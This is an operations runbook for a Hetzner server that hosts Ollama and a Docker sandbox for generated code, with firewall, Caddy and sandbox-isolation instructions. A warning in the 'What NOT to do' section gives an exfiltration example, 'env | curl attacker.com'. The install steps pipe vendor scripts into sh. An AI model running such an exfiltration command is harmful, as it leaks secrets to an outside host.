# Hetzner host setup for Code Flow

This is the operations runbook for the Hetzner box that runs Ollama (Tier 2
local LLM) and the build sandbox (Tier 4 ephemeral container). The Railway
orchestrator talks to both over HTTPS.

## Why Hetzner here

Railway can't run heavy local LLMs (no GPU, container memory caps) and
shouldn't execute generated code in-process. Hetzner gives you a dedicated
box with predictable monthly cost, your choice of CPU/GPU profile, and no
container-execution restrictions. The right shape for v1:

- **CPU-only path (cheapest):** AX42 (~€55/month, AMD Ryzen 7700, 64 GB RAM).
  Runs Qwen2.5-Coder-7B comfortably on CPU. Build sandbox runs Docker fine.
  Use this if v1 quality is acceptable on a 7B model.
- **GPU path (better quality):** Server Auction GPU box or one of the new
  Hetzner GPU dedicated lines. Lets you run Qwen2.5-Coder-32B at usable
  latency. Roughly €150–400/month depending on card.

Don't over-provision before you have customers. Start CPU-only.

## What runs on the box

Two long-running services behind a Caddy reverse proxy:

1. **Ollama** on `:11434` (loopback only). Caddy exposes it at
   `https://ollama.<your-domain>` with bearer-token auth.
2. **Sandbox runner** on `:8080` (loopback only). Caddy exposes it at
   `https://sandbox.<your-domain>` with the same bearer-token auth.

Nothing else publicly reachable. SSH on `:22` restricted to a small
allowlist (your IP, Railway's egress range if you can pin it, your VPN).

## Install steps

Assuming a fresh Hetzner Ubuntu 24.04 box:

```bash
# 1. System hygiene
apt update && apt upgrade -y
apt install -y ufw fail2ban unattended-upgrades

# 2. Firewall — closed by default, only 22, 80, 443 open
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable

# 3. Docker (for the sandbox runner's ephemeral containers)
curl -fsSL https://get.docker.com | sh

# 4. Ollama
curl -fsSL https://ollama.com/install.sh | sh
# Bind to loopback only — never expose Ollama directly
echo 'OLLAMA_HOST=127.0.0.1:11434' >> /etc/environment
systemctl restart ollama
ollama pull qwen2.5-coder:7b   # or :32b if GPU

# 5. Caddy for HTTPS termination + bearer auth
apt install -y caddy
# Caddyfile (next section)
systemctl restart caddy

# 6. Sandbox runner — clone the codeflow repo, install deps
git clone https://github.com/<you>/codeflow /opt/codeflow
cd /opt/codeflow/sandbox
# Sandbox runner is a small FastAPI app that wraps `docker run`. To be
# built; spec below.
systemctl enable --now codeflow-sandbox
```

## Caddyfile

```
ollama.<your-domain> {
    reverse_proxy 127.0.0.1:11434 {
        header_up Authorization {http.request.header.Authorization}
    }
    @bad {
        not header Authorization "Bearer {env.HETZNER_API_TOKEN}"
    }
    respond @bad "unauthorized" 401
}

sandbox.<your-domain> {
    reverse_proxy 127.0.0.1:8080 {
        header_up Authorization {http.request.header.Authorization}
    }
    @bad {
        not header Authorization "Bearer {env.HETZNER_API_TOKEN}"
    }
    respond @bad "unauthorized" 401
}
```

`HETZNER_API_TOKEN` lives in `/etc/caddy/codeflow.env` (mode 600, owned by
caddy:caddy) and is referenced via `EnvironmentFile=` in the systemd unit
override. Same token used by Railway when it calls the box.

## Sandbox runner contract

The Hetzner-side sandbox runner is a small FastAPI app that exposes:

```
POST /run
Headers: Authorization: Bearer <HETZNER_API_TOKEN>
Body: {
  "files": { "package.json": "...", "src/index.ts": "..." },
  "runtime": "node20" | "python311" | "bun1",
  "install_command": "npm ci",
  "test_command": "npm test",
  "env": { "SOME_VAR": "value" },
  "limits": { "cpu": 2.0, "memory_mb": 2048 }
}
Returns: {
  "sandbox_id": "uuid",
  "success": true,
  "build_log": "...",
  "test_log": "...",
  "test_pass_count": 42,
  "test_fail_count": 1,
  "runtime_seconds": 38.2,
  "artifacts": { "dist/index.js": "<sha256>" }
}
```

Implementation pattern:

1. Create a tmpfs working directory.
2. Write the files into it.
3. `docker run --rm --read-only --network=none --memory=<mb>m --cpus=<cpu>
   --tmpfs /tmp -v <workdir>:/work -w /work <runtime-image>` to run install
   and test in sequence.
4. Stream logs back; on completion, hash any declared artifacts.
5. Tear down the tmpfs and remove the container.

The `--network=none` is the most important bit. Generated code does not get
internet access during test runs. If a build needs package installs, do
them in a separate `docker run` step with `--network` pointed at a private
npm/pypi mirror; once install completes, drop the network for the test
step.

## What NOT to do on this box

- Don't run generated code outside the sandbox. Not "just to debug." Not
  "just this once." The sandbox perimeter is the whole point.
- Don't put secrets in env vars that the sandbox container can read.
  Generated code can `env | curl attacker.com`. Pass build-time secrets
  only when strictly necessary, and rotate them on every build.
- Don't put customer data here. The ledger lives in Supabase. This box is
  stateless modulo model weights and the OS — if it falls over, you
  reprovision and lose nothing.

## Monitoring

The Railway worker calls both endpoints' `/health` every minute as part of
its reconciliation tick. When either fails for >5 min, the orchestrator
falls back to Tier 3 (cloud APIs) for everything until the Hetzner box
recovers. This is a feature: you can reboot the Hetzner box during
business hours without taking the product down.
